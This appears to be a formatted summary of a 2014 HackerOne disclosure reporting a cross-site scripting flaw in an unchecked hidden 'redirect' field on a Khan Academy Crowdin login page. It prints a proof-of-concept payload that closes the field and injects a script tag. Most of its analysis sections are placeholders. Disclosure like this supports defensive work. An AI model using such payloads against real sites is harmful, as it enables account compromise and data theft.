# Unchecking hidden parameter is vulnerable to XSS-attack

## Metadata
- **Source:** HackerOne
- **Report:** 13506 | https://hackerone.com/reports/13506
- **Submitted:** 2014-05-26
- **Reporter:** bigbear
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Unchecking parameter <input type="hidden" name="redirect">

Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.

http://crowdin.khanacademy.org:/login

PoC
<input type="hidden" name="redirect" value="/project_actions/load_discussions/"><script>prompt(986874)</script>"/>


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Unchecking parameter <input type="hidden" name="redirect">

Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.

http://crowdin.khanacademy.org:/login

PoC
<input type="hidden" name="redirect" value="/project_actions/load_discussions/"><script>prompt(986874)</script>"/>


</details>

---
*Analysed by Claude on 2026-05-24*
